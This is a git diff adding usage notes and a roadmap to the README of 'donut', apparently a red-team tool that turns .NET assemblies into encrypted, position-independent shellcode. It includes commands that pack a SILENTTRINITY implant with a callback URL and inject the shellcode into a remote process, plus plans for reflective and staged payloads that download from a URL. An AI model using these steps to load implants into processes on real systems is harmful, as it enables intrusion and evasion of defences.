@@ -1,11 +1,27 @@
 # donut
 Generates position-independant shellcode to bootstrap and load .NET Assemblies.
 
+Usage:
+
+.\donut.exe .\SILENTTRINITY_DLL.dll ST Main http://192.168.197.134:80
+
+Running donut.exe will run the shellcode to test it, so be careful. 
+
+You can test the payload in a remote process by using:
+
+.\inject.exe /pic ./donut.exe64.bin /donut.cfg
+
+How does this work? 
+
+Overall, donut creates position-independant shellcode that loads a .NET Assembly using the Unmanaged CLR Hosting APIs. The .NET Assembly is encrypted using SPECK block cipher in CTR mode. It's very compact and doesn't take up much space but isn't easy to break. When the shellcode executes, it loads the CLR, decrypts the Assembly, loads it into the CLR, and executes the entry point specified by the user. Currently, it can only take on argument, but we are working on fixing that.
+
+The DonutTest project is a C# tester that injects a calc popper into notepad using CreateRemoteThread.
+
 # Project plan
 
 We'll do it in stages to avoid feature creep and allow for iterative development.
 
-1) Create a PIC payload to load an arbitrary .NET Assembly with n arguments.
+1) Create a PIC payload to load an arbitrary .NET Assembly with n arguments. For DLLs, the user should specify the entry point. For EXEs, the PIC should get the Entry Point using Assembly.EntryPoint.
 2) Create a C and Python generator for the PIC shellcode payloads.
 3) Create reflective DLL injection version that uses a reflective bootstrap DLL (Unmanaged CLR Hosting API) to load the Assembly. Have the generator output both the shellcode and the bootstrap DLL. This is easier for operators to modify and lets them use the DLL for normal reflective DLL injection
 4) Created staged versions of both of these payload types that downloads the Assembly from a URL.
